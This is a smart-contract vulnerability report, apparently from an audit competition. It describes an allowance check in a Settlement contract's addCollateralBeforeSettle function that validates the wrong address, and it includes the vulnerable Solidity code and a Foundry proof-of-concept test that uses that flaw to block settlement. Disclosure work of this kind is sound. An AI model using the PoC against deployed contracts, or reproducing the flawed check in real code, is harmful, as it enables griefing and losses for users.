# #47118 \[SC-High] Incorrect Allowance Validation in addCollateralBeforeSettle

**Submitted on Jun 9th 2025 at 03:23:03 UTC by @Catchme for** [**IOP | Term Structure Institutional**](https://immunefi.com/audit-competition/iop-term-structure)

* **Report ID:** #47118
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/term-structure/tsi-contract/blob/main/src/Settlement.sol>
* **Impacts:**
  * Protocol insolvency
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

The `addCollateralBeforeSettle` function in Settlement.sol contains a critical logic flaw in its allowance validation mechanism. The function incorrectly validates the caller's (`msg.sender`) token allowance instead of validating the actual fund provider's (taker's) allowance. This disconnect between validation and execution allows any user to artificially inflate collateral requirements without ensuring proper financial backing.

## Vulnerability Details

The issue is located at lines 189-190 in Settlement.sol:

```solidity
function addCollateralBeforeSettle(string memory _loanId, uint256 addedAmount) public nonReentrant {
    bytes32 loanId = _loanId.toBytes32();
    
    LoanInfo memory loanInfo = loans[loanId];
    if (loanInfo.maker == address(0)) {
        revert LoanNotFound(loanId);
    }
    if (loanInfo.settled) {
        revert LoanAlreadySettled(loanId);
    }
    loanInfo.addCollateral(addedAmount);
    if (settlements[loanInfo.settlementId].takerType == TakerType.BORROW) {
        // BUG: Validates wrong address allowance
        uint256 allowance = IERC20(loanInfo.collateralTokenAddr).allowance(msg.sender, address(this));
        if (allowance < loanInfo.debtData.collateralAmt) {
            revert TokenAllowanceInsufficient(allowance, loanInfo.debtData.collateralAmt);
        }
    }
    
    loans[loanId] = loanInfo;
    emit CollateralAdded(msg.sender, loanId, addedAmount);
}
```

The root cause of this vulnerability is that:

1. In the settlement flow, collateral tokens flow from the `borrower` (taker) to the `lender`
2. However, the function validates `msg.sender`'s allowance, who may be neither party
3. This creates a disconnect between authorization verification and actual fund transfer logic
4. During settlement, the actual borrower's allowance may be insufficient, causing transaction failures

The logical flaw: When `takerType` is `BORROW`, the collateral should come from the borrower (taker), but the function validates an arbitrary caller's allowance instead.

## Impact Details

1. **Financial Risk**:
   * Users can manipulate loan collateral records without corresponding financial backing
   * Creates phantom collateral that cannot be honored during settlement
   * Potential for economic losses when transactions fail in volatile markets
2. **System Stability**:
   * Settlement operations will fail when collateral transfer attempts exceed the taker's actual allowance
   * Core lending functionality breaks down, compromising the protocol's reliability
   * Transaction failures during critical market movements could cause significant financial losses

## Proof of Concept

## Proof of Concept

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "../src/Settlement.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 * 10**18);
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockOracle is IOracle {
    function getPrice(address token) external pure override returns (PriceInfo memory) {
        return PriceInfo({
            price: 1e18,  // 1:1 price ratio for simplicity
            timestamp: block.timestamp,
            source: "MOCK"
        });
    }
}

contract AllowanceValidationPOC is Test {
    Settlement settlement;
    MockERC20 collateralToken;
    MockERC20 debtToken;
    MockOracle oracle;
    
    address admin = address(1);
    address feeCollector = address(2);
    address operator = address(3);
    address lender = address(4);
    address borrower = address(5);
    address thirdParty = address(6);  // Will call addCollateralBeforeSettle
    
    uint256 initialCollateral = 100 * 10**18;  // 100 tokens
    uint256 additionalCollateral = 50 * 10**18; // 50 tokens
    uint256 borrowAmount = 80 * 10**18;  // 80 tokens
    string loanIdStr = "test-loan";
    bytes32 loanId;
    
    function setUp() public {
        // Deploy tokens and contract
        collateralToken = new MockERC20("Collateral Token", "CTKN");
        debtToken = new MockERC20("Debt Token", "DTKN");
        oracle = new MockOracle();
        
        // Deploy settlement contract
        settlement = new Settlement(admin, feeCollector, operator, address(oracle));
        
        // Distribute tokens
        collateralToken.transfer(borrower, 500 * 10**18);
        collateralToken.transfer(thirdParty, 500 * 10**18);
        debtToken.transfer(lender, 500 * 10**18);
        
        // Set up approvals
        vm.startPrank(borrower);
        collateralToken.approve(address(settlement), initialCollateral);  // Limited approval for demo
        vm.stopPrank();
        
        vm.startPrank(thirdParty);
        collateralToken.approve(address(settlement), type(uint256).max);  // Third party gives high approval
        vm.stopPrank();
        
        vm.startPrank(lender);
        debtToken.approve(address(settlement), type(uint256).max);
        collateralToken.approve(address(settlement), type(uint256).max);
        vm.stopPrank();
        
        // Create settlement with a loan
        createSettlement();
    }
    
    function createSettlement() internal {
        // Create settlement with initial loan
        string memory settlementIdStr = "test-settlement";
        bytes32 settlementId = bytes32(bytes(settlementIdStr));
        
        string[] memory loanIds = new string[](1);
        loanIds[0] = loanIdStr;
        loanId = bytes32(bytes(loanIdStr));
        
        LoanInfo[] memory loanInfos = new LoanInfo[](1);
        DebtData memory debtData = DebtData({
            borrowedAmt: borrowAmount,
            debtAmt: borrowAmount,
            feeAmt: 0,
            collateralAmt: initialCollateral
        });
        
        loanInfos[0] = LoanInfo({
            maker: lender,
            borrower: borrower,
            lender: lender,
            debtTokenAddr: address(debtToken),
            collateralTokenAddr: address(collateralToken),
            settlementId: bytes32(0),
            debtData: debtData,
            settled: false
        });
        
        SettleInfo memory settleInfo = SettleInfo({
            taker: borrower,
            takerType: TakerType.BORROW,
            expiryTime: block.timestamp + 1 days
        });
        
        // Mock signature for simplicity
        bytes memory signature = abi.encodePacked(bytes32(0), bytes32(0), uint8(0));
        vm.mockCall(
            address(operator),
            abi.encodeWithSelector(SignatureChecker.isValidSignatureNow.selector),
            abi.encode(true)
        );
        
        // Create settlement as borrower
        vm.startPrank(borrower);
        settlement.createSettlement(settlementIdStr, settleInfo, loanIds, loanInfos, signature);
        vm.stopPrank();
    }
    
    function testIncorrectAllowanceValidation() public {
        // Display initial state
        console.log("===== Initial State =====");
        console.log("Borrower approval for contract:", collateralToken.allowance(borrower, address(settlement)) / 1e18);
        console.log("ThirdParty approval for contract:", collateralToken.allowance(thirdParty, address(settlement)) / 1e18);
        console.log("Initial collateral requirement:", initialCollateral / 1e18);
        
        // Step 1: Third party calls addCollateralBeforeSettle
        // This should work even though borrower (the actual taker) has insufficient allowance for the new amount
        vm.startPrank(thirdParty);
        settlement.addCollateralBeforeSettle(loanIdStr, additionalCollateral);
        vm.stopPrank();
        
        // Step 2: Verify that collateral amount was increased
        LoanInfo memory loanInfo = settlement.getLoan(loanIdStr);
        uint256 newCollateralAmt = loanInfo.debtData.collateralAmt;
        
        console.log("\n===== After addCollateralBeforeSettle =====");
        console.log("New collateral requirement:", newCollateralAmt / 1e18);
        console.log("Borrower approval for contract:", collateralToken.allowance(borrower, address(settlement)) / 1e18);
        
        // Step 3: Attempt to settle the loan (should fail due to borrower's insufficient allowance)
        vm.startPrank(lender);
        vm.expectRevert(); // This should fail because borrower doesn't have enough allowance
        settlement.settle(loanIdStr);
        vm.stopPrank();
        
        console.log("\n===== Settlement Attempt =====");
        console.log("Settlement failed as expected due to borrower's insufficient allowance");
        
        // Step 4: Demonstrate the correct behavior by increasing borrower's allowance and settling
        vm.startPrank(borrower);
        collateralToken.approve(address(settlement), newCollateralAmt * 2); // Approve enough for settlement
        vm.stopPrank();
        
        console.log("\n===== After Increasing Borrower's Allowance =====");
        console.log("Borrower approval for contract:", collateralToken.allowance(borrower, address(settlement)) / 1e18);
        
        // Now settlement should succeed
        vm.startPrank(lender);
        settlement.settle(loanIdStr);
        vm.stopPrank();
        
        // Verify settlement completed
        loanInfo = settlement.getLoan(loanIdStr);
        console.log("\n===== After Successful Settlement =====");
        console.log("Loan settled:", loanInfo.settled ? "Yes" : "No");
        
        // Step 5: Demonstrate what happens if we fix the vulnerability
        console.log("\n===== Demonstrating Fixed Behavior =====");
        console.log("With correct validation, addCollateralBeforeSettle would check borrower's allowance");
        console.log("This would prevent inflation of collateral requirements without proper backing");
    }
    
    function testProperValidationBehavior() public {
        // This demonstrates how the function should work if properly implemented
        console.log("===== Proper Validation Behavior (Simulated) =====");
        
        // Create a new loan for demonstration
        string memory newLoanId = "another-loan";
        createAnotherLoan(newLoanId);
        
        // Show initial borrower allowance
        console.log("Initial borrower allowance:", collateralToken.allowance(borrower, address(settlement)) / 1e18);
        
        // Simulate proper checking (as if code was fixed)
        uint256 borrowerAllowance = collateralToken.allowance(borrower, address(settlement));
        uint256 newCollateralAmt = initialCollateral + additionalCollateral;
        bool wouldSucceed = borrowerAllowance >= newCollateralAmt;
        
        console.log("Attempting to add collateral of:", additionalCollateral / 1e18);
        console.log("New total collateral would be:", newCollateralAmt / 1e18);
        console.log("With proper validation, operation would succeed:", wouldSucceed ? "Yes" : "No");
        
        if (!wouldSucceed) {
            console.log("This prevents phantom collateral that cannot be honored during settlement");
        }
    }
    
    function createAnotherLoan(string memory _loanId) internal {
        // Helper function to create another loan for demonstration
        // Similar to createSettlement but with a different loan ID
        string memory settlementIdStr = "test-settlement-2";
        
        string[] memory loanIds = new string[](1);
        loanIds[0] = _loanId;
        
        LoanInfo[] memory loanInfos = new LoanInfo[](1);
        DebtData memory debtData = DebtData({
            borrowedAmt: borrowAmount,
            debtAmt: borrowAmount,
            feeAmt: 0,
            collateralAmt: initialCollateral
        });
        
        loanInfos[0] = LoanInfo({
            maker: lender,
            borrower: borrower,
            lender: lender,
            debtTokenAddr: address(debtToken),
            collateralTokenAddr: address(collateralToken),
            settlementId: bytes32(0),
            debtData: debtData,
            settled: false
        });
        
        SettleInfo memory settleInfo = SettleInfo({
            taker: borrower,
            takerType: TakerType.BORROW,
            expiryTime: block.timestamp + 1 days
        });
        
        bytes memory signature = abi.encodePacked(bytes32(0), bytes32(0), uint8(0));
        vm.mockCall(
            address(operator),
            abi.encodeWithSelector(SignatureChecker.isValidSignatureNow.selector),
            abi.encode(true)
        );
        
        vm.startPrank(borrower);
        settlement.createSettlement(settlementIdStr, settleInfo, loanIds, loanInfos, signature);
        vm.stopPrank();
    }
}
```
